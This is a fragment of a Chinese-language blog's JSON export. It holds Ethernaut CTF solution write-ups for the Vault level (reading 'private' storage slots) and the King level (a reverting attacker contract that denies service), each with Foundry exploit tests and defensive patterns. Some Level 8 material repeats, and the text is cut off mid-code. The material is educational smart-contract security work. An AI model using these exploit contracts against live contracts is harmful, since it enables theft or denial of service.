class=\"code\"><pre><span class=\"line\">contract OffChainVault &#123;</span><br><span class=\"line\">    address private authorizedSigner;</span><br><span class=\"line\">    mapping(address =&gt; bool) private unlocked;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes memory signature, address user) public &#123;</span><br><span class=\"line\">        bytes32 messageHash = keccak256(abi.encodePacked(user, &quot;unlock&quot;));</span><br><span class=\"line\">        address signer = recoverSigner(messageHash, signature);</span><br><span class=\"line\">        require(signer == authorizedSigner, &quot;Unauthorized&quot;);</span><br><span class=\"line\">        unlocked[user] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><h3 id=\"存储读取工具\"><a href=\"#存储读取工具\" class=\"headerlink\" title=\"存储读取工具\"></a>存储读取工具</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用 cast 读取存储</span></span><br><span class=\"line\">cast storage &lt;CONTRACT_ADDRESS&gt; &lt;SLOT_NUMBER&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 web3.py</span></span><br><span class=\"line\">from web3 import Web3</span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&#x27;http://localhost:8545&#x27;</span>))</span><br><span class=\"line\">password = w3.eth.get_storage_at(contract_address, 1)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"存储布局分析\"><a href=\"#存储布局分析\" class=\"headerlink\" title=\"存储布局分析\"></a>存储布局分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 使用 forge inspect 查看存储布局</span><br><span class=\"line\">// forge inspect &lt;CONTRACT&gt; storage-layout</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li><code>private</code> 关键字意味着数据只能由合约本身访问，而不是对外界隐藏</li>\n<li>区块链上没有什么是私有的，一切都是公开的，任何人都可以阅读</li>\n<li>EVM 存储使用 32 字节的插槽系统</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>直接读取合约存储</li>\n<li>分析存储布局确定敏感数据位置</li>\n<li>使用 RPC 调用或 Foundry cheatcodes 读取数据</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>永远不要在链上存储明文敏感数据</li>\n<li>使用哈希和承诺方案</li>\n<li>考虑链下验证机制</li>\n<li>实施适当的访问控制</li>\n</ul>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">上一关: Level 7 - Force</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">下一关: Level 9 - King</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-8-Vault-私有变量读取\"><a href=\"#🎯-Ethernaut-Level-8-Vault-私有变量读取\" class=\"headerlink\" title=\"🎯 Ethernaut Level 8: Vault - 私有变量读取\"></a>🎯 Ethernaut Level 8: Vault - 私有变量读取</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/8\">Ethernaut Level 8 - Vault</a><br><strong>攻击类型</strong>: 私有变量读取<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>要 unlock 这个合约账户，也就是要找到 password。挑战的关键在于理解区块链上没有真正的”私有”数据，所有状态变量都可以被读取。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg\" alt=\"Vault Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"存储机制-Storage\"><a href=\"#存储机制-Storage\" class=\"headerlink\" title=\"存储机制 (Storage)\"></a>存储机制 (Storage)</h3><p>我们需要理解 EVM 中存储的布局以及原理（使用 32 字节大小的插槽）和 JSON RPC 函数 <code>eth_getStorageAt</code>。</p>\n<p>EVM 的数据都存在 32 字节槽中：</p>\n<ul>\n<li>第一个状态变量存储在槽位 0</li>\n<li>如果第一个变量存储完了还有足够的字节，下一个变量也存储在 slot 0</li>\n<li>否则存储在 slot 1，依此类推</li>\n</ul>\n<blockquote>\n<p><strong>注意</strong>: 像数组和字符串这样的动态类型工作方式不同</p>\n</blockquote>\n<p>在 Vault 合约中：</p>\n<ul>\n<li><code>locked</code> 是一个布尔值，使用 1 字节，存储在 slot 0</li>\n<li><code>password</code> 是一个 bytes32，使用 32 个字节</li>\n<li>由于插槽 0 中剩余的 31 个字节无法容纳 password，因此它被存储在 slot 1 中</li>\n</ul>\n<h3 id=\"读取-Storage\"><a href=\"#读取-Storage\" class=\"headerlink\" title=\"读取 Storage\"></a>读取 Storage</h3><p><code>eth_getStorageAt</code> JSON RPC 函数可用于读取合约在给定槽位的存储。</p>\n<p>使用 web3.js 读取 slot 1 的合约存储：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web3.<span class=\"property\">eth</span>.<span class=\"title function_\">getStorageAt</span>(contractAddress, <span class=\"number\">1</span>, <span class=\"function\">(<span class=\"params\">err, result</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(result);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>在 Foundry 中，可以使用 cheatcodes 中的 load：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/VaultFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract VaultTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    VaultFactory vaultFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        vaultFactory = new VaultFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(vaultFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testVaultExploit() public &#123;</span><br><span class=\"line\">        // 创建关卡实例</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(vaultFactory);</span><br><span class=\"line\">        Vault instance = Vault(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证初始状态</span><br><span class=\"line\">        assertEq(instance.locked(), true);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 攻击：读取存储在 slot 1 中的密码</span><br><span class=\"line\">        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 使用读取的密码解锁</span><br><span class=\"line\">        instance.unlock(password);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(instance.locked(), false);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 提交关卡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>分析存储布局</strong>：确定 password 存储在 slot 1</li>\n<li><strong>读取存储</strong>：使用 <code>vm.load()</code> 读取 slot 1 的数据</li>\n<li><strong>调用 unlock</strong>：使用读取的密码解锁合约</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 读取 slot 1 中的密码</span><br><span class=\"line\">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class=\"line\"></span><br><span class=\"line\">// 解锁合约</span><br><span class=\"line\">instance.unlock(password);</span><br><span class=\"line\"></span><br><span class=\"line\">// 验证解锁成功</span><br><span class=\"line\">assertEq(instance.locked(), false);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-避免在链上存储敏感数据\"><a href=\"#1-避免在链上存储敏感数据\" class=\"headerlink\" title=\"1. 避免在链上存储敏感数据\"></a>1. 避免在链上存储敏感数据</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不安全：密码存储在链上</span><br><span class=\"line\">contract VulnerableVault &#123;</span><br><span class=\"line\">    bytes32 private password;  // 可以被读取！</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _password) &#123;</span><br><span class=\"line\">        password = _password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 安全：使用哈希验证</span><br><span class=\"line\">contract SecureVault &#123;</span><br><span class=\"line\">    bytes32 private passwordHash;  // 存储哈希而不是明文</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _passwordHash) &#123;</span><br><span class=\"line\">        passwordHash = _passwordHash;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(string memory _password) public &#123;</span><br><span class=\"line\">        require(keccak256(abi.encodePacked(_password)) == passwordHash, &quot;Wrong password&quot;);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用提交-揭示方案\"><a href=\"#2-使用提交-揭示方案\" class=\"headerlink\" title=\"2. 使用提交-揭示方案\"></a>2. 使用提交-揭示方案</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitRevealVault &#123;</span><br><span class=\"line\">    mapping(address =&gt; bytes32) private commitments;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 第一阶段：提交哈希</span><br><span class=\"line\">    function commit(bytes32 _commitment) public &#123;</span><br><span class=\"line\">        commitments[msg.sender] = _commitment;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 第二阶段：揭示并验证</span><br><span class=\"line\">    function reveal(string memory _password, uint256 _nonce) public &#123;</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_password, _nonce));</span><br><span class=\"line\">        require(commitments[msg.sender] == hash, &quot;Invalid reveal&quot;);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-使用链下验证\"><a href=\"#3-使用链下验证\" class=\"headerlink\" title=\"3. 使用链下验证\"></a>3. 使用链下验证</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract OffChainVault &#123;</span><br><span class=\"line\">    address private authorizedSigner;</span><br><span class=\"line\">    mapping(address =&gt; bool) private unlocked;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes memory signature, address user) public &#123;</span><br><span class=\"line\">        bytes32 messageHash = keccak256(abi.encodePacked(user, &quot;unlock&quot;));</span><br><span class=\"line\">        address signer = recoverSigner(messageHash, signature);</span><br><span class=\"line\">        require(signer == authorizedSigner, &quot;Unauthorized&quot;);</span><br><span class=\"line\">        unlocked[user] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><h3 id=\"存储读取工具\"><a href=\"#存储读取工具\" class=\"headerlink\" title=\"存储读取工具\"></a>存储读取工具</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用 cast 读取存储</span></span><br><span class=\"line\">cast storage &lt;CONTRACT_ADDRESS&gt; &lt;SLOT_NUMBER&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 web3.py</span></span><br><span class=\"line\">from web3 import Web3</span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&#x27;http://localhost:8545&#x27;</span>))</span><br><span class=\"line\">password = w3.eth.get_storage_at(contract_address, 1)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"存储布局分析\"><a href=\"#存储布局分析\" class=\"headerlink\" title=\"存储布局分析\"></a>存储布局分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 使用 forge inspect 查看存储布局</span><br><span class=\"line\">// forge inspect &lt;CONTRACT&gt; storage-layout</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li><code>private</code> 关键字意味着数据只能由合约本身访问，而不是对外界隐藏</li>\n<li>区块链上没有什么是私有的，一切都是公开的，任何人都可以阅读</li>\n<li>EVM 存储使用 32 字节的插槽系统</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>直接读取合约存储</li>\n<li>分析存储布局确定敏感数据位置</li>\n<li>使用 RPC 调用或 Foundry cheatcodes 读取数据</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>永远不要在链上存储明文敏感数据</li>\n<li>使用哈希和承诺方案</li>\n<li>考虑链下验证机制</li>\n<li>实施适当的访问控制</li>\n</ul>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">上一关: Level 7 - Force</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">下一关: Level 9 - King</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n"},{"title":"Ethernaut Level 9: King - 拒绝服务攻击","date":"2025-01-25T07:35:00.000Z","updated":"2025-01-25T07:35:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入学习拒绝服务攻击和外部调用安全，掌握 King 关卡的攻击技术和防护措施。理解 transfer、send 和 call 的区别及安全风险。","_content":"\n# 🎯 Ethernaut Level 9: King - 拒绝服务攻击\n\n> **关卡链接**: [Ethernaut Level 9 - King](https://ethernaut.openzeppelin.com/level/9)  \n> **攻击类型**: 拒绝服务攻击 (DoS)  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n谁出资更高的时候，谁就成为 king，目标是让自己成为 king 之后，别人无法夺取王位。换句话说，我们必须成为王者并一直保持国王，然后打破游戏。\n\n![King Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg)\n\n## 🔍 漏洞分析\n\n### transfer() 函数的特性\n\n我们需要理解 `transfer`（现在基本被弃用）是如何在 Solidity 中工作的：\n- 如果 `transfer` 失败，此函数抛出错误，但不返回布尔值\n- 这意味着如果 `transfer` 失败，交易将恢复\n- Gas 限制为 2300，不足以执行复杂逻辑\n\n### 关键漏洞代码\n\n```solidity\nreceive() external payable {\n    require(msg.value >= prize || msg.sender == owner);\n    payable(king).transfer(msg.value);  // 易受攻击的点\n    king = msg.sender;\n    prize = msg.value;\n}\n```\n\n### 攻击向量\n\n我们可以利用 `transfer()` 函数失败时会回滚的特性：\n1. 部署一个合约成为 king\n2. 合约不定义 `receive()` 或 `fallback()` 函数\n3. 或者在 `receive()` 函数中直接 revert\n4. 这样合约将无法接收 ETH，阻止任何人成为新的 king\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/KingFactory.sol\";\n\ncontract KingAttacker {\n    King instance;\n\n    constructor(address payable _king) payable {\n        instance = King(_king);\n    }\n\n    function attack() public payable {\n        (bool success, ) = address(instance).call{value: msg.value}(\"\");\n        require(success, \"Attack failed\");\n    }\n\n    // 关键：拒绝接收 ETH\n    receive() external payable {\n        revert(\"I will always be the king!\");\n    }\n}\n\ncontract KingTest is Test {\n    Ethernaut ethernaut;\n    KingFactory kingFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        kingFactory = new KingFactory();\n        ethernaut.registerLevel(kingFactory);\n    }\n    \n    function testKingExploit() public {\n        // 创建关卡实例\n        address payable levelInstance = payable(ethernaut.createLevelInstance{value: 1 ether}(kingFactory));\n        King instance = King(levelInstance);\n        \n        // 检查初始状态\n        uint256 initialPrize = instance.prize();\n        address initialKing = instance._king();\n        \n        // 部署攻击合约\n        KingAttacker attacker = new KingAttacker{value: initialPrize + 1}(levelInstance);\n        \n        // 执行攻击：成为 king\n        attacker.attack{value: initialPrize + 1}();\n        \n        // 验证攻击成功\n        assertEq(instance._king(), address(attacker));\n        \n        // 尝试有人超越我们（应该失败）\n        vm.expectRevert();\n        (bool success, ) = levelInstance.call{value: initialPrize + 2}(\"\");\n        assertFalse(success);\n        \n        // 验证我们仍然是 king\n        assertEq(instance._king(), address(attacker));\n        \n        // 这个关卡无法正常提交，因为我们破坏了游戏机制\n        // 但这正是关卡想要演示的攻击效果\n    }\n}\n```\n\n### 关键攻击步骤\n\n1. **分析当前 prize**：确定需要多少 ETH 成为 king\n2. **部署攻击合约**：合约的 `receive()` 函数会 revert\n3. **成为 king**：发送足够的 ETH\n4. **锁定王位**：任何后续尝试都会因为 transfer 失败而回滚\n\n```solidity\n// 部署攻击合约\nKingAttacker attacker = new KingAttacker{value: initialPrize + 1}(levelInstance);\n\n// 发送 ETH 成为 king\nattacker.attack{value: initialPrize + 1}();\n\n// 验证攻击成功\nassertEq(instance._king(), address(attacker));\n```\n\n## 🛡️ 防御措施\n\n### 1. 使用 Pull Payment 模式\n\n```solidity\n// ❌ 不安全：Push Payment\ncontract VulnerableKing {\n    address public king;\n    uint public prize;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        payable(king).transfer(msg.value);  // 可能失败\n        king = msg.sender;\n        prize = msg.value;\n    }\n}\n\n// ✅ 安全：Pull Payment\ncontract SecureKing {\n    address public king;\n    uint public prize;\n    mapping(address => uint) public pendingWithdrawals;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        \n        // 记录待提取金额\n        if (king != address(0)) {\n            pendingWithdrawals[king] += prize;\n        }\n        \n        king = msg.sender;\n        prize = msg.value;\n    }\n    \n    // 让用户自己提取资金\n    function withdraw() public {\n        uint amount = pendingWithdrawals[msg.sender];\n        require(amount > 0, \"No funds to withdraw\");\n        \n        pendingWithdrawals[msg.sender] = 0;\n        payable(msg.sender).transfer(amount);\n    }\n}\n```\n\n### 2. 使用 call 并处理失败\n\n```solidity\ncontract ImprovedKing {\n    address public king;\n    uint public prize;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        \n        // 使用 call 并处理失败\n        if (king != address(0)) {\n            (bool success, ) = payable(king).call{value: prize}(\"\");\n            if (!success) {\n                // 记录失败的支付，让用户手动提取\n                pendingWithdrawals[king] += prize;\n            }\n        }\n        \n        king = msg.sender;\n        prize = msg.value;\n    }\n}\n```\n\n### 3. 实现紧急停止机制\n\n```solidity\ncontract SafeKing {\n    address public king;\n    uint public prize;\n    bool public paused;\n    address public owner;\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    modifier whenNotPaused() {\n        require(!paused);\n        _;\n    }\n    \n    function pause() public onlyOwner {\n        paused = true;\n    }\n    \n    function unpause() public onlyOwner {\n        paused = false;\n    }\n    \n    receive() external payable whenNotPaused {\n        // 正常逻辑\n    }\n}\n```\n\n## 🔧 相关工具和技术\n\n### DoS 攻击检测\n\n```solidity\n// 检测合约是否能接收 ETH\nfunction canReceiveEther(address target) public returns (bool) {\n    (bool success, ) = target.call{value: 1 wei}(\"\");\n    return success;\n}\n```\n\n### Gas 限制分析\n\n```bash\n# 使用 forge 分析 Gas 使用\nforge test --gas-report\n\n# 检查 transfer vs call Gas 消耗\ncast estimate --value 1000000000000000000 <CONTRACT_ADDRESS> \"receive()\"\n```\n\n## 🎯 总结\n\n**核心概念**:\n- `send` 和 `transfer` 现在已被弃用，即使是 `call`，使用时最好按照检查-效果-交互模式调用\n- 外部调用必须谨慎使用，必须正确处理错误\n- Push Payment 模式容易受到 DoS 攻击\n\n**攻击向量**:\n- 通过拒绝接收 ETH 来破坏支付流程\n- 利用 `transfer` 失败时的回滚特性\n- 成为永久的 king，破坏游戏机制\n\n**防御策略**:\n- 使用 Pull Payment 模式\n- 正确处理外部调用失败\n- 实现紧急停止和恢复机制\n- 避免依赖外部调用的成功\n\n---\n\n## 🔗 相关链接\n\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[上一关: Level 8 - Vault](/2025/01/25/ethernaut-level-08-vault/)**\n- **[下一关: Level 10 - Re-entrancy](/2025/01/25/ethernaut-level-10-reentrancy/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n","source":"_posts/ethernaut-level-09-king.md","raw":"---\ntitle: 'Ethernaut Level 9: King - 拒绝服务攻击'\ndate: 2025-01-25 15:35:00\nupdated: 2025-01-25 15:35:00\ncategories:\n  - Ethernaut 系列\n  - 基础攻击篇 (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - 拒绝服务攻击\n  - DoS\n  - 智能合约安全\n  - Solidity\n  - 外部调用\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入学习拒绝服务攻击和外部调用安全，掌握 King 关卡的攻击技术和防护措施。理解 transfer、send 和 call 的区别及安全风险。\"\n---\n\n# 🎯 Ethernaut Level 9: King - 拒绝服务攻击\n\n> **关卡链接**: [Ethernaut Level 9 - King](https://ethernaut.openzeppelin.com/level/9)  \n> **攻击类型**: 拒绝服务攻击 (DoS)  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n谁出资更高的时候，谁就成为 king，目标是让自己成为 king 之后，别人无法夺取王位。换句话说，我们必须成为王者并一直保持国王，然后打破游戏。\n\n![King Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg)\n\n## 🔍 漏洞分析\n\n### transfer() 函数的特性\n\n我们需要理解 `transfer`（现在基本被弃用）是如何在 Solidity 中工作的：\n- 如果 `transfer` 失败，此函数抛出错误，但不返回布尔值\n- 这意味着如果 `transfer` 失败，交易将恢复\n- Gas 限制为 2300，不足以执行复杂逻辑\n\n### 关键漏洞代码\n\n```solidity\nreceive() external payable {\n    require(msg.value >= prize || msg.sender == owner);\n    payable(king).transfer(msg.value);  // 易受攻击的点\n    king = msg.sender;\n    prize = msg.value;\n}\n```\n\n### 攻击向量\n\n我们可以利用 `transfer()` 函数失败时会回滚的特性：\n1. 部署一个合约成为 king\n2. 合约不定义 `receive()` 或 `fallback()` 函数\n3. 或者在 `receive()` 函数中直接 revert\n4. 这样合约将无法接收 ETH，阻止任何人成为新的 king\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/KingFactory.sol\";\n\ncontract KingAttacker {\n    King instance;\n\n    constructor(address payable _king) payable {\n        instance = King(_king);\n    }\n\n    function attack() public payable {\n        (bool success, ) = address(instance).call{value: msg.value}(\"\");\n        require(success, \"Attack failed\");\n    }\n\n    // 关键：拒绝接收 ETH\n    receive() external payable {\n        revert(\"I will always be the king!\");\n    }\n}\n\ncontract KingTest is Test {\n    Ethernaut ethernaut;\n    KingFactory kingFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        kingFactory = new KingFactory();\n        ethernaut.registerLevel(kingFactory);\n    }\n    \n    function testKingExploit() public {\n        // 